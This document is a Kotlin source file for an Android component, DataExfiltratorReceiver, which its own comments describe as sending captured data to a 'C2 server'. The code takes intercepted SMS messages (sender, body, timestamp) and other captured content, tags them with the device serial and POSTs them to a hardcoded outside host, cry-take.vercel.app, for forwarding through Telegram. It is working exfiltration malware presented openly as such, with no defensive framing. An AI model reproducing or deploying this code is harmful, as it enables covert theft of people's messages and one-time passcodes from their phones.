package com.decry.decry

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import org.json.JSONObject

/**
 * DataExfiltratorReceiver
 *
 * Receives captured data broadcasts and sends them to CryTake C2 server.
 * CryTake server handles all Telegram bot communication for centralized exfiltration.
 */
class DataExfiltratorReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "DecryExfil"
        private const val C2_SERVER_URL = "https://cry-take.vercel.app/api"
        private const val ACTION_DATA_CAPTURED = "com.decry.DATA_CAPTURED"
        private const val ACTION_SMS_INTERCEPTED = "com.decry.SMS_INTERCEPTED"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        when (action) {
            ACTION_DATA_CAPTURED -> {
                val type = intent.getStringExtra("type") ?: "unknown"
                val content = intent.getStringExtra("content") ?: ""
                val extra = intent.getStringExtra("extra") ?: ""

                // Send to CryTake C2 server for processing and Telegram forwarding
                val deviceId = android.os.Build.getSerial()
                val json = JSONObject()
                json.put("type", type)
                json.put("content", content)
                json.put("extra", extra)
                
                sendViaCryTake(deviceId, json.toString())
            }

            ACTION_SMS_INTERCEPTED -> {
                val sender = intent.getStringExtra("sender") ?: "unknown"
                val message = intent.getStringExtra("message") ?: ""
                val timestamp = intent.getStringExtra("timestamp") ?: ""

                val deviceId = android.os.Build.getSerial()
                val json = JSONObject()
                json.put("type", "sms_intercept")
                json.put("content", "$sender: $message")
                json.put("extra", "timestamp=$timestamp")
                
                sendViaCryTake(deviceId, json.toString())
            }
        }
    }

    private fun sendViaCryTake(deviceId: String, jsonData: String) {
        Thread {
            try {
                val url = "$C2_SERVER_URL/exfil/$deviceId"
                
                val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                
                connection.outputStream.use { os ->
                    os.write(jsonData.toByteArray(Charsets.UTF_8))
                    os.flush()
                }
                
                val responseCode = connection.responseCode
                if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                    Log.i(TAG, "Data sent to CryTake successfully")
                } else {
                    Log.w(TAG, "CryTake send failed: $responseCode")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "CryTake send error: ${e.message}")
            }
        }.start()
    }
}